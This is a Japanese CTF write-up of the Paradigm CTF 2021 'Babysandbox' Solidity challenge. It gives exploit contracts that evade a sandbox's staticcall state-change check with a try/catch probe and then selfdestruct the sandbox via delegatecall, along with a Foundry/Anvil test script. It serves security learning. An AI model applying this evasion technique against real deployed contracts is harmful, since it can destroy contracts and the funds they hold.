# Paradigm CTF 2021: Babysandbox

## ソース
- [問題コントラクト](challenge)
- [Exploit](BabysandboxExploit.sol)
- [Test](test_exploit.sh)

## 概要
`Babysandbox`コントラクトの`run`関数で`selfdestruct`を実行する問題。ただしステート変化の検知を回避する必要がある。

## Writeup
`assembly`ブロックの1つ目のif文の条件を満たせば、`run`関数の引数であるアドレス`code`に対してdelegatecallできる。

```solidity
if eq(caller(), address()) {
    switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)
    case 0 {
        returndatacopy(0x00, 0x00, returndatasize())
        revert(0x00, returndatasize())
    }
    case 1 {
        returndatacopy(0x00, 0x00, returndatasize())
        return(0x00, returndatasize())
    }
}
```

よって、アドレス`code`のコントラクトで`selfdestruct`すれば解けそうであるが、単純に`fallback`関数で`selfdestruct`しても失敗する。
というのも、delegatecallを実行する前に`code`に対して同じcalldata (=`""`)でstaticcallが実行され、そのstaticcallが失敗すると、その時点で`run`関数はrevertされる。
つまり、staticcallで`selfdestruct`のようなステートが変化する処理を単純に実行してしまうとdelegatecallに辿り着けない。

```solidity
// run using staticcall
// if this fails, then the code is malicious because it tried to change state
if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) { revert(0x00, 0x00) }

// if we got here, the code wasn't malicious
// run without staticcall since it's safe
switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)
case 0 { returndatacopy(0x00, 0x00, returndatasize()) }
case 1 {
    returndatacopy(0x00, 0x00, returndatasize())
    return(0x00, returndatasize())
}
```

### staticcallを無視したexploit
簡単のためにstaticcallでのステート変化の検知を無視した場合を考えてみる。
このときdelegatecallを実行するには、if文の条件「`caller()`と`address()`の一致」を満たす必要がある。
これを満たすにはsandbox内からcallすれば良い。

`call(0x4000, address(), 0, 0, calldatasize(), 0, 0)`の部分を考える。callの引数は、順に`gas`, `address`, `value`, `argsOffset`, `argsSize`, `retOffset`, `retSize`の7つ。
`calldatacopy`によってcalldataはメモリにコピー済みであるため、calldata（`run`関数の実行部）がそのまま渡されることになる。そしてdelegatecallが`code`に対して実行される。

そのため、staticcallを無視すれば以下のexploitで良い。
```solidity
contract BabysandboxExploit {
    fallback() external {
        selfdestruct(payable(address(0)));
    }
}
```

### staticcallを考慮したexploit
staticcallによってステートの変化が起きる`selfdestruct`は単純に実行できずrevertされる。
最初に実行されるstaticcallと次に実行されるcallをexploit側が区別する方法が必要である。
これはtry/catch文を使って実際に状態を変化させられるかどうかを試すことで判別できる。
try文の式には外部関数コールとコントラクト作成のみ指定できるから、

- 外部関数コールで別のコントラクトのステートが変化できるかどうかを試し、
- もし変化可能ならdelegatecallを実行、
- そうでないなら何もしない

というようにすれば、staticcallのステート変化検知によるrevertを回避できる。
そしてstaticcallを失敗させずにcallに辿り着き実行を継続させられる。

例えば、以下のようなコードを思いつく。
```solidity
contract StateChange {
    uint a = 0;

    function change() external {
        a++;
    }
}

contract BabysandboxExploit {
    StateChange immutable stateChange;

    constructor() {
        stateChange = new StateChange();
    }

    fallback() external {
        try stateChange.f() {
            selfdestruct(payable(address(0)));
        }
        catch {}
    }
}
```

しかし、これは`OutOfGas`になる。callの`0x4000` (`16384`) gasの制限に引っかかるためである。
関数`change`の実行に20000 gasほどかかる。
これに対処するには`StateChange`の変数を無くし、`selfdestruct`やログの発火に変えると良い。それぞれ関数`change`の実行が7704 gasと890 gasになる。
最終的なexploitは以下。

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract StateChange {
    event changed();

    function change() external {
        emit changed();
    }
}

contract BabysandboxExploit {
    StateChange immutable stateChange;

    constructor() {
        stateChange = new StateChange();
    }

    fallback() external {
        try stateChange.change() {
            selfdestruct(payable(address(0)));
        } catch {}
    }
}
```

### 余談: `selfdestruct`のガス払い戻しの廃止

Paradigm CTF 2021が開催された2021年2月頃は、EVMのバージョンがMuir Glacierだった。
この時点では、`selfdestruct`はさらにガスを節約できた。

2022年8月現在はGray Glacierであるが、2021年8月のLondonハードフォークでEIP-3529により`selfdestruct`のガス払い戻しが廃止された。

関連リソース
- [EIP-2200: Structured Definitions for Net Gas Metering](https://eips.ethereum.org/EIPS/eip-2200)
- [EIP-3298: Removal of refunds](https://eips.ethereum.org/EIPS/eip-3298)
- [EIP-3403: Partial removal of refunds](https://eips.ethereum.org/EIPS/eip-3403)
- [EIP-3529: Reduction in refunds](https://eips.ethereum.org/EIPS/eip-3529) (status: final)

## Test

```
bash src/ParadigmCTF2021/Babysandbox/test_exploit.sh
```

**Testの解説**

Forgeのtestはtransaction-baseであるため、テストの間は`extcodesize`の結果が変わらない。
よってtest機能は使わず、Forgeのscript機能とAnvilを組み合わせることでテストを行う。まずはsetup用とplayer用の2つのアカウントを決める。今回はAnvilのデフォルトアカウント（0番目と1番目）を使う。

```sh
export RPC_ANVIL=http://127.0.0.1:8545
export FOUNDRY_ETH_RPC_URL=$RPC_ANVIL

# Anvil account 0
export PRIVATE_KEY_SETUP=ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
# Anvil account 1
export PRIVATE_KEY_PLAYER=59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

次にAnvilを起動する。
```sh
anvil --hardfork Istanbul --silent 1>/dev/null &
sleep 1
```
`sleep`は使いたくないが、これを挟んでAnvilが完全に起動するまで待たないと次に実行する`forge script`でRPCのエラーが起きる。

EVMのバージョンを`MuirGlacier`ではなく`Istanbul`にしているのは、FoundryがMuir Glacierの指定に対応しておらず、`forge script`実行時に`Spec Not supported`のパニックが起きるからである（下記参照）。

```rs
pub fn evm_inner<'a, DB: Database, const INSPECT: bool>(
    env: &'a mut Env,
    db: &'a mut DB,
    insp: &'a mut dyn Inspector<DB>,
) -> Box<dyn Transact + 'a> {
    match env.cfg.spec_id {
        SpecId::LATEST => create_evm!(LatestSpec, db, env, insp),
        SpecId::MERGE => create_evm!(MergeSpec, db, env, insp),
        SpecId::LONDON => create_evm!(LondonSpec, db, env, insp),
        SpecId::BERLIN => create_evm!(BerlinSpec, db, env, insp),
        SpecId::ISTANBUL => create_evm!(IstanbulSpec, db, env, insp),
        SpecId::BYZANTIUM => create_evm!(ByzantiumSpec, db, env, insp),
        _ => panic!("Spec Not supported"),
    }
}
```

scriptを実行する。
```sh
forge script BabysandboxExploitTestScript --fork-url $RPC_ANVIL --broadcast --private-keys $PRIVATE_KEY_SETUP --private-keys $PRIVATE_KEY_PLAYER --gas-limit 30000000 --gas-estimate-multiplier 200 -vvvvv --legacy
```
現在、Forgeのscriptで個別のトランザクションにgasを指定する方法が存在しないため、`--gas-estimate-multiplier 200`を指定する必要がある。関連: https://github.com/foundry-rs/foundry/issues/2627 。また当時はトランザクション手数料マーケットがLondonハードフォークで導入されたEIP-1559ではないため`--legacy`オプションをつける。


解けたかどうか`cast call`で確認する。
```sh
# 31337: chain id of Anvil
SETUP_ADDRESS=$(python -c 'import json; print(json.load(open("broadcast/BabysandboxExploitTest.s.sol/31337/run-latest.json"))["transactions"][0]["contractAddress"])')
# A result of EXTCODESIZE remains the same until a transaction is terminated.
SOLVED=$(cast call $SETUP_ADDRESS "isSolved()(bool)")

pkill anvil

echo "Result:" $SOLVED
```

結果:
```
Result: true
```